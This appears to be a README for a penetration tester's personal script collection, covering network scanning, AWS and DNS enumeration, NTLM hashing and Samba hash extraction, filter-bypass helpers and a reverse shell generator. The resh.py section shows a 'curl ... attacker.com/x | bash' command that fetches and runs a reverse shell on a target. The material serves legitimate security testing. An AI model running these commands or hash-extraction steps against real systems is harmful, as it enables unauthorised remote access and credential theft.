# Tools

## [adminer.sh](./adminer.sh) - Secure Neo4j Password Wrapper for AD-miner

`adminer.sh` is a stupid wrapper. This script prompts for the password in a hidden input, runs AD-miner with the specified domain.

## [arpa.sh](./arpa.sh) - Quick Network Overview and Open Ports Scan

This script is can quickly gather a list of connected devices on a host, mostly intesting because of Docker containers, and perform a fast scan for common open ports. The main goal is to curl this script into bash for an immediate overview of active hosts and their services.

The script leverages tools like `ip`, `arp`, `nc`, and `awk` to identify available hosts and check for open ports on a predefined list of common service ports.

#### Features:
- **Network interface discovery**: Lists network interfaces and associated IP addresses.
- **Connected hosts detection**: Uses ARP to list devices currently connected to the network.
- **Port scanning**: Scans common service ports on discovered hosts, excluding local IPs, to quickly find open ports.
- **Lightweight**: The script is designed to be quick and easy to use, requiring only basic command-line utilities.

#### Usage:
```bash
curl -sSL <script_url> | bash
```
## [aws_enum.sh](./aws_enum.sh) - Quick Overview of AWS Resources

This script automates the process of fetching details about AWS resources using a specified AWS profile. It logs the output to a file and retrieves key information like EC2 instances, S3 buckets, VPCs, IAM users, and more. It’s useful for getting a quick overview of the AWS environment, especially during audits or troubleshooting.

#### Features:
- **AWS Profile Support**: Allows specifying an AWS profile to fetch details.
- **Detailed Logging**: Logs all fetched data into a file for easy review.
- **Resource fetching**: Retrieves information about key AWS resources such as:
  - EC2 instances
  - S3 buckets
  - RDS instances
  - VPCs
  - Security groups
  - IAM users and roles
- **Error Handling**: Captures and logs errors during the data fetching process.

#### Usage:
```bash
aws_enum.sh <aws-profile>
```



## [CertipyPermParse.py](./CertipyPermParse.py) - Parse Certipy JSON Output for ACL Anomalies

This tool parses Certipy JSON output to identify anomalies in Access Control Lists (ACLs), helping you hunt for potential targets in a Windows Active Directory environment. By analyzing certificate templates, permissions, and vulnerabilities, the tool filters out standard groups and highlights unusual access permissions that could indicate misconfigurations or attack vectors.

#### Features:
- Parses JSON output from Certipy to identify anomalies in ACLs.
- Filters out known administrative groups such as "Domain Admins" and "Enterprise Admins" to focus on unusual principals.
- Detects potential certificate vulnerabilities and permissions issues, such as unauthorized write access.
- Supports exporting results to CSV for easy analysis.
- Option to check only active certificates.
- Allows for additional exclusions of specific principals.

#### Usage:
```bash
python3 certipy_parser.py <file_path> [--csv <output_file>] [--exclude <principal1> <principal2>] [--active-only]
```

- `<file_path>`: Path to the Certipy JSON output file.
- `--csv`: (Optional) Path to save the parsed results as a CSV file.
- `--exclude`: (Optional) Additional principals to exclude from the results.
- `--active-only`: (Optional) Check only active certificate templates.

```bash
python3 certipy_parser.py certipy_output.json --csv results.csv --exclude "Test User" --active-only
```

## [dns-dump.py](./dns-dump.py) - Resolve Domains and Dump DNS Records

`dns-dump.py` is a Python script that resolves domain names to their corresponding IP addresses and, optionally, dumps all DNS records for each domain. The script supports saving the results in JSON format for easy review and analysis.

#### Usage:
```bash
python3 dns-dump.py <file> [--json] [--dump]
```

## [dns-query.py](./dns-query.py)

Its `dig` ok?

## [hosts.py](./hosts.py) - Manage /etc/hosts File Quickly and Efficiently

`hosts.py` is one of my most used tools for quickly interacting with the `/etc/hosts` file. It allows for fast management of host entries, such as adding new IP-to-domain mappings, replacing existing entries (box reset), deleting entries, and listing current hosts. This script is especially helpful when you need to add virtual hosts (vhosts) and provides an efficient way to manage multiple entries without manually editing the file.

#### Features:
- **List entries**: Display all current IP/domain mappings in the `/etc/hosts` file.
- **Add entries**: Add new IP/domain entries or append subdomains to existing IP addresses.
- **Replace entries**: Replace the IP address for a specific domain quickly.
- **Delete entries**: Remove an entire IP entry or just a specific domain from an IP address.

#### Usage:
```bash
./hosts.py list              # List all entries
./hosts.py add <ip> <domain> # Add a new entry
./hosts.py replace <new_ip> <domain> # Replace an existing entry's IP
./hosts.py rm                # Delete an entry or specific domain
```

## [image-converter.py](./image-converter.py) - Convert Images to Different File Types for File Upload Testing

`image-converter.py` is a small script that quickly converts an image into various file formats, making it ideal for testing file upload vulnerabilities. The script helps to generate multiple versions of an image to test for bypass file upload restrictions or filters.

#### Usage:
```bash
python3 image-converter.py <image_file> <output_directory>
```

## [ipconv.py](./ipconv.py) - Convert IP Addresses to Various Formats to Bypass Restrictions

`ipconv.py` is a Python script that converts IPv4 addresses into different formats such as decimal, octal, and hexadecimal. These alternate representations of IP addresses can be useful for bypassing certain security restrictions or filters that may not recognize IPs in non-standard formats.

#### Usage:
```bash
python3 ipconv.py <ip_address>
```

## [namegen.py](./namegen.py) - Generate Variants of Usernames for Enumeration

This tool generates various username variants based on a list of input names. It is especially useful for creating permutations of usernames that can be used during penetration testing. The tool supports generating combinations for both single-word and multi-word names, producing multiple formats such as hyphenated, underscored, and concatenated usernames.

#### Features:
- Generates multiple variants for both single-word and multi-word names.
- Supports variants with hyphens, underscores, dots, and concatenation.
- Saves generated usernames to a `users.generated` file in the current directory.

#### Example:
```bash
┌──(kalikali)-[/tmp/foo]
└─$ echo "Foo Bar" > names.txt 
                                                                                                                                                           
┌──(kalikali)-[/tmp/foo]
└─$ namegen.py names.txt
[*] Names Loaded:
    + Foo Bar
[*] File Saved to: /tmp/foo/users.generated
   
┌──(kalikali)-[/tmp/foo]
└─$ cat users.generated 
Foo-Bar
Foo_Bar
Foo.Bar
Foo Bar
FooBar
FBar
FooB
F-Bar
F_Bar
F.Bar
Foo-B
Foo_B
Foo.B
FB
```

## [ntlm-hasher.py](./ntlm-hasher.py) - Calculate the NTLM Hash of a Password

`ntlm-hasher.py` is a simple Python script used to compute the NTLM hash of a given password.

#### Usage:
```bash
python3 ntlm-hasher.py <password>
```

## [ratelimit_check.py](./ratelimit_check.py) - Check for Rate Limiting on API Endpoints

`ratelimit_check.py` is a tool used to test for rate limiting on URL endpoints, specifically targeting API endpoints. The script sends a specified number of POST requests to a given URL and tracks the responses, allowing you to detect any signs of rate limiting or throttling by monitoring the returned HTTP status codes.

#### Features:
- **API Rate Limiting Detection**: Sends multiple POST requests to an API endpoint to check for rate limits.
- **Customizable Data**: Supports sending data as JSON or form-encoded.
- **Request Customization**: Configure the number of requests to send to the target endpoint.
- **Status Code Analysis**: Counts and displays the frequency of each HTTP status code received, helping identify rate-limiting behavior.
- **Performance Monitoring**: Tracks and reports the total time taken to send all requests.

#### Usage:
```bash
python3 ratelimit_check.py <url> <data> [--content-type json|form] [--num-requests <n>]
```


## [resh.py](./resh.py) - Reliant Reverse Shell Generator

`resh.py` is a Python script that generates a reverse shell script in multiple languages (Python, Perl, Netcat, PHP, Ruby, Lua, etc.) based on the target machine’s available interpreters. The generated reverse shell script can be easily executed by curling the output into bash, making it convenient for quick reverse shell setups during penetration testing.

This tool is not written by me. It's based on old reverse shell generators that you could curl. You can just curl the output into bash to retrieve a reverse shell without worrying about encoding or complex setups.

#### Features:
- **Multi-language reverse shell**: Generates reverse shell commands in multiple languages (Python, Perl, Netcat, PHP, Ruby, Lua), depending on what's available on the target system.
- **Quick reverse shell setup**: The output can be curled directly into bash for quick remote access.
- **Easy customization**: Accepts local host (`lhost`) and local port (`lport`) as inputs, customizing the reverse shell to your setup.

#### Usage:
```bash
python3 resh.py <lhost> <lport> <filename>
```

```bash
# Generate a reverse shell script that connects back to 10.10.10.10 on port 4444
python3 resh.py 10.10.10.10 4444 x

# Curl the generated file and execute it on the target machine
curl -sSL http://attacker.com/x | bash
```


## [sammy.py](./sammy.py) - Extract NTLM Hashes from Samba's sam.ldb Database

`sammy.py` is a tool to extract NTLM hashes from Samba's `sam.ldb` database. It connects to the database, searches for user objects with `unicodePwd` attributes, and converts these to NTLM-like hashes that can be used for further analysis or cracking.

#### Features:
- Connects to Samba's `sam.ldb` database using the Samba libraries.
- Extracts `unicodePwd` attributes and converts them to NTLM hashes.
- Provides output showing the username and corresponding NTLM hash.

#### Usage:
```bash
python3 sammy.py <ldb_file>
```

## [subb.py](./subb.py) - Quick V-Host Enumeration and Subdomain Discovery

`subb.py` can quickly find virtual hosts (vhosts) for a given domain by either using a provided wordlist or generating a custom list of keywords using CeWL.

#### Features:
- **Wordlist-based enumeration**: Use a file of potential subdomains to identify valid vhosts.
- **CeWL integration**: Automatically generate custom wordlists by running CeWL on a target URL, useful for vhost enumeration based on content.
- **TLS and port options**: Supports HTTPS or custom ports for flexible vhost discovery.
- **Verbose mode**: Provides detailed information about each request, including headers and response content.
- **Invalid response size filtering**: Allows specification of a response size that should be considered invalid.

#### Usage:
```bash
./subb.py <domain> [subdomain_input] [--tls] [--port <port>] [--verbose] [--max-redirects <n>] [--cewl <url>] [--fs <invalid_size>]
```

- `domain`: The target domain for vhost enumeration.
- `subdomain_input`: A subdomain or a file containing subdomains (optional if using CeWL).
- `--tls`: Use HTTPS instead of HTTP.
- `--port`: Specify a custom port for the requests.
- `--verbose`: Print detailed output of the subdomain responses.
- `--max-redirects`: Set a maximum number of redirects to follow (default is 3).
- `--cewl`: Run CeWL on a given URL to generate a custom list of subdomains.
- `--fs`: Specify a response size that should be considered invalid.



## [url-enum.sh](./url-enum.sh) - Enumerate and Extract URLs from Domains

`url-enum.sh` is a Bash script that enumerates URLs from a list of domains using various tools such as `httpx`, `gospider`, `paramspider`, `gau`, `hakrawler`, and `galer`. It collects URLs from multiple sources, cleans them, and outputs the results into a file for further processing. The extracted URLs can then be used with other scripts, such as `url-parse-js.sh` for additional analysis.

#### Features:
- **URL enumeration**: Extracts URLs from a list of domains using several tools to gather comprehensive results.
- **Cookie-based authentication**: Optionally provide a session cookie for authentication when needed.
- **Multiple sources**: Utilizes `gospider`, `paramspider`, `gau`, `hakrawler`, and `galer` to ensure extensive URL collection.
- **Clean output**: Filters and cleans the extracted URLs, outputting unique results to a file.

#### Usage:
```bash
# Enumerate URLs from domains with session authentication
./url-enum.sh -f domains.txt -c "session_token=abc123"

# Enumerate URLs without authentication
./url-enum.sh -f domains.txt
```


## [url-parse-js.sh](./url-parse-js.sh) - Extract and Process JavaScript URLs from Domains

`url-parse-js.sh` is a Bash script that extracts and processes JavaScript URLs from a list of domains and URLs. The script parses URLs, identifies JavaScript files, and can optionally use a provided cookie for session authentication. It processes the URLs, downloads the source code, and filters out unnecessary responses, such as HTTP 404 and 304 codes.

#### Features:
- **Extract JavaScript URLs**: Parses a list of URLs to find JavaScript files associated with the domains provided.
- **Optional cookie-based authentication**: Allows providing a session cookie for authentication when required.
- **Download source code**: Uses `httpx` to download the JavaScript source code from the URLs, storing it in a specified directory.

#### Usage:
```bash
# Extract and process JavaScript URLs with authentication
./url-parse-js.sh -d domains.txt -u urls.txt -c "session_token=abc123"

# Extract and process JavaScript URLs without authentication
./url-parse-js.sh -d domains.txt -u urls.txt
```

This script is particularly useful when you need to extract and analyze JavaScript files from multiple domains, with or without session-based authentication.







